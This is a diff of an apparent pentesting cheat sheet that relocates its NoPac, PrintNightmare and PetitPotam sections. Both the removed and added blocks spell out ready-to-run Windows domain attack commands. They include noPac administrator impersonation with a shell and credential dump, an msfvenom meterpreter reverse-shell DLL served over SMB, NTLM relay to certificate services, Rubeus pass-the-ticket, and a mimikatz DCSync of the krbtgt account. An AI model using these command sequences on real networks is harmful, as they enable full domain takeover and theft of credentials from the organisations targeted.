@@ -974,44 +974,6 @@ https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
 use exploit/windows/http/prtg_authenticated_rce
 ```
 
-- NoPac
-
-```
-https://github.com/Ridter/noPac
-$ sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <IP address> -use-ldap
-$ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> -shell --impersonate administrator -use-ldap
-$ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
-```
-
-- PrintNightmare
-
-```
-https://github.com/cube0x0/CVE-2021-1675
-$ pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install
-$ rpcdump.py @<IP address> | egrep 'MS-RPRN|MS-PAR'
-$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<port> -f dll > backupscript.dll
-$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
-$ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<IP address>\CompData\backupscript.dll'
-```
-
-- PetitPotam
-
-```
-https://github.com/topotam/PetitPotam
-$ sudo ntlmrelayx.py -debug -smb2support --target http://<hostname>/certsrv/certfnsh.asp --adcs --template DomainController
-$ python3 PetitPotam.py <Attacker IP address> <Domain Controller IP address>
-mimikatz # misc::efs /server:<Domain Controller IP address> /connect:<Attacker IP address>
-https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1
-$ python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<machine account>\$ -pfx-base64 <base64 certificate> = dc01.ccache
-$ export KRB5CCNAME=dc01.ccache
-$ secretsdump.py -just-dc-user <domain>/<username> -k -no-pass "<machine account>$"@<hostname>
-$ klist
-$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 <domain>/<machine account>$
-$ secretsdump.py -just-dc-user <domain</administrator "<machine account>$"@<IP address> -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
-C:\> .\Rubeus.exe asktgt /user:<machine account>$ /<base64 certificate>=/ptt
-mimikatz # lsadump::dcsync /user:<domain>\krbtgt
-```
-
 - Juicy Potato
 
 ```
@@ -3086,6 +3048,44 @@ https://github.com/flast101/php-8.1.0-dev-backdoor-rce
 
 ```
 https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py
+```
+
+- NoPac
+
+```
+https://github.com/Ridter/noPac
+$ sudo python3 scanner.py <domain>/<username>:<password> -dc-ip <IP address> -use-ldap
+$ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> -shell --impersonate administrator -use-ldap
+$ sudo python3 noPac.py <domain>/<username>:<password> -dc-ip <IP address> -dc-host <hostname> --impersonate administrator -use-ldap -dump -just-dc-user <domain>/administrator
+```
+
+- PrintNightmare
+
+```
+https://github.com/cube0x0/CVE-2021-1675
+$ pip3 uninstall impacket git clone https://github.com/cube0x0/impacket cd impacket python3 ./setup.py install
+$ rpcdump.py @<IP address> | egrep 'MS-RPRN|MS-PAR'
+$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP address> LPORT=<port> -f dll > backupscript.dll
+$ sudo smbserver.py -smb2support CompData /path/to/backupscript.dll
+$ sudo python3 CVE-2021-1675.py <domain>/<username>:<password>@<IP address> '\\<IP address>\CompData\backupscript.dll'
+```
+
+- PetitPotam
+
+```
+https://github.com/topotam/PetitPotam
+$ sudo ntlmrelayx.py -debug -smb2support --target http://<hostname>/certsrv/certfnsh.asp --adcs --template DomainController
+$ python3 PetitPotam.py <Attacker IP address> <Domain Controller IP address>
+mimikatz # misc::efs /server:<Domain Controller IP address> /connect:<Attacker IP address>
+https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/Invoke-Petitpotam.ps1
+$ python3 /opt/PKINITtools/gettgtpkinit.py <domain>/<machine account>\$ -pfx-base64 <base64 certificate> = dc01.ccache
+$ export KRB5CCNAME=dc01.ccache
+$ secretsdump.py -just-dc-user <domain>/<username> -k -no-pass "<machine account>$"@<hostname>
+$ klist
+$ python /opt/PKINITtools/getnthash.py -key 70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 <domain>/<machine account>$
+$ secretsdump.py -just-dc-user <domain</administrator "<machine account>$"@<IP address> -hashes aad3c435b514a4eeaad3b935b51304fe:313b6f423cd1ee07e91315b4919fb4ba
+C:\> .\Rubeus.exe asktgt /user:<machine account>$ /<base64 certificate>=/ptt
+mimikatz # lsadump::dcsync /user:<domain>\krbtgt
 ```
 
 - CVE-2019-1040
